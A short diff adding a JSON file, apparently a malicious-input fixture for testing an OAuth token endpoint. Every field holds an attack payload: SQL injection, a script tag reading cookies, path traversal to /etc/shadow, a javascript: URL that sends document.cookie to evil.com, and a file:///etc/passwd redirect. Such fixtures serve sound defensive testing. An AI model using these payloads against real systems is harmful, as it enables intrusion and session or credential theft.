@@ -1,0 +1,7 @@
+{
+  "grant_type": "authorization_code'; SELECT * FROM secrets; --",
+  "code": "<script>alert(document.cookie)</script>",
+  "client_id": "../../../etc/shadow",
+  "client_secret": "javascript:fetch('http://evil.com/steal?cookie='+document.cookie)",
+  "redirect_uri": "file:///etc/passwd"
+}
